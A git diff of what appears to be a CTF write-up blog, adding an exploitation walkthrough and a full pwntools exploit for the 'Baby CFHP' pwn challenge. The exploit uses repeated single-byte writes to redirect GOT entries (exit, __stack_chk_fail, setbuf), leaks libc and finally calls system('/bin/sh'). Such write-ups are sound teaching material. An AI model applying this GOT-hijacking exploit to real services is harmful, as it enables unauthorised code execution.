@@ -32,6 +32,7 @@ Amnesia is the typical challenge with a vulnerable format string, but with certa
     IBT:        Enabled
 ```  
 
+## Exploitation
 I take advantage of the first format string to get all the necessary leaks: Text base, Libc base, and Stack. Since p and $ are prohibited, I have to use %c and %ld.  
 With the following format string, I am going to overwrite the blacklist, because since I now only have 32 characters in the format string and can't use $, it becomes impossible to do anything more useful. In the first iteration, I overwrite the $ with any number.  
 ```py
@@ -186,6 +187,168 @@ for b in payload:
     idx += 1
 
 p.sendlineafter(b'remember?', b'I remember everything!')
+
+######################################################################################
+
+p.interactive()
+```
+
+## Baby CFHP
+![Baby](https://raw.githubusercontent.com/elchals/elchals.github.io/main/_posts/2024-10-13_Imges/BabyCFHT.png)
+
+
+- **Category:** Pwn.  
+- **Points:** 221
+- **Solves:** 11  
+- **Author:** rui  
+
+## Description
+This challenge allows us to write a single byte at the address we want. That byte is encoded using:  
+```c
+*ptr = (*ptr & ~((1<<16)-1)) | ((*ptr & 0xff) ^ ((val & 0xff) ^ ((val & 0xff) >> 1))) | (*ptr & 0xffff &~0xff);	
+```
+Challenge protections:  
+```
+➜  baby_cfhp checksec chall  
+[*] '/home/elchals/CTFs/Tcp1p/baby_cfhp/chall'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+## Exploitation
+I haven't tried to decipher how that encoding works. Instead, I have created a function to obtain the byte I need to write using brute force.  
+```py
+def find_value(ptr, val):
+    for i in range(0x100):
+        b = ptr ^ (i ^ (i >> 1))
+        if b == val:
+            print("[i] byte:", hex(i))
+            return i
+```
+I used the first flip byte to modify **exit@Got** so that it points to _start, creating an infinite loop to perform all the necessary flips. After that, I change it to call **main**. Then, I obtain a libc leak from stderr by pointing **setbuf@got** to **puts**. Finally, I call **system("/bin/sh")** by modifying **setbuf@got** to point to **system** and writing **"/bin/sh"** to **stderr**.  
+
+## Code
+```py
+#!/bin/python3
+from pwn import *
+
+context.log_level = 'INFO'
+context.terminal = ['remotinator', 'vsplit', '-x']
+context.arch = 'amd64'
+
+######################################################################################
+
+process_name = './chall_patched'
+elf = context.binary = ELF(process_name)
+libc = ELF('./libc.so.6')
+
+HOST = "ctf.tcp1p.team"
+PORT = 20011
+
+######################################################################################
+
+gdb_script = f'''
+    #set breakpoint pending on
+    continue
+    '''
+
+def find_value(ptr, val):
+    for i in range(0x100):
+        b = ptr ^ (i ^ (i >> 1))
+        if b == val:
+            print("[i] byte:", hex(i))
+            return i
+
+def change_addr(addr, new_byte, actual_byte):
+    new_byte = find_value(actual_byte, new_byte)
+    p.sendlineafter(b'address:', str(addr).encode())
+    p.sendlineafter(b'value:', str(new_byte).encode())
+
+def write_qword(addr, actual_value, new_value):
+    actual_value = p64(actual_value)
+    new_value = p64(new_value)
+
+    for i in range(8):
+        print(f"Addr {hex(addr + i)}, {hex(new_value[i])}, {hex(actual_value[i])}")
+        change_addr(addr + i, new_value[i], actual_value[i])
+
+def connect():
+    if args.REMOTE:
+        print(f"[*] Connecting to {HOST} : {PORT}")
+        p = remote(HOST, PORT, ssl=False)        
+    elif args.GDB:
+        print(f'[*] Debugging {elf.path}.')
+        p = gdb.debug([elf.path], gdbscript=gdb_script, aslr=False)
+    else:
+        print(f'[*] Executing {elf.path}.')
+        p = process([elf.path])
+    return p
+
+
+######################################################################################
+
+p = connect()
+
+# exit@got -> _start
+change_addr(elf.got.exit, 0xd0, 0x70)
+
+# Looping Main
+# [0x404018] stack_chk_fail@got -> main 
+change_addr(elf.got.__stack_chk_fail, 0xb6, 0x30)
+change_addr(elf.got.__stack_chk_fail+1, 0x11, 0x10)
+
+# exit@got -> __stack_chk_fail@plt> -> main
+change_addr(elf.got.exit, 0x80, 0xd0)
+
+# Leaking Libc Base with setbuf->puts
+# [0x404020] setbuf@Got -> 0x7ffff7c80e50 <puts>
+change_addr(elf.got.setbuf, 0x50, 0xe0)
+change_addr(elf.got.setbuf+1, 0x0e, 0x7f)
+
+# Stderr+8 = libc address
+# 0x404080 <stderr@GLIBC_2.2.5>:	0x00007ffff7e1b6a0	
+# 0x7ffff7e1b6a0 <_IO_2_1_stderr_>:	0x00000000fbad2087	0x00007ffff7e1b723
+change_addr(0x404080, 0xa8, 0xa0)
+
+# exit@got -> _start
+# $2 = {<text variable, no debug info>} 0x4010d0 <_start>
+# [0x404038] exit@GLIBC_2.2.5 -> 0x401080 (__stack_chk_fail@plt) ◂— endbr64 
+change_addr(elf.got.exit, 0xd0, 0x80)
+
+p.recvline()
+p.recvline()
+leak = u64(p.recvline().strip().ljust(8, b'\x00')) 
+libc.address = leak - (0x7ffff7e1b723 - 0x7ffff7c00000)
+print("[i] Libc Base:", hex(libc.address))
+
+# ROP
+rop_libc = ROP(libc)
+binSh    = next(libc.search(b"/bin/sh"))
+system = libc.sym.system
+
+print("[i] BinSh:", hex(binSh))
+
+# 0x401080 <__stack_chk_fail@plt>:	endbr64
+# exit@got -> __stack_chk_fail@plt> -> main
+change_addr(elf.got.exit, 0x80, 0xd0)
+
+# 0x404080 <stderr@GLIBC_2.2.5>:	0x00007ffff7e1b6a0	-> binSh
+actual_value = libc.address + (0x00007ffff7e1b6a8 - 0x7ffff7c00000)
+write_qword(0x404080, binSh, actual_value)
+
+# [0x404020] setbuf@GLIBC_2.2.5 -> 0x7ffff7c80e50 (puts) ◂— endbr64 
+# setbuf@GLIBC_2.2.5 -> System
+write_qword(elf.got.setbuf, system, libc.sym.puts)
+
+# [0x404038] exit@GLIBC_2.2.5 -> 0x401080 (__stack_chk_fail@plt) ◂— endbr64 
+# exit@GLIBC_2.2.5 -> start
+change_addr(elf.got.exit, 0xd0, 0x80)
 
 ######################################################################################
 
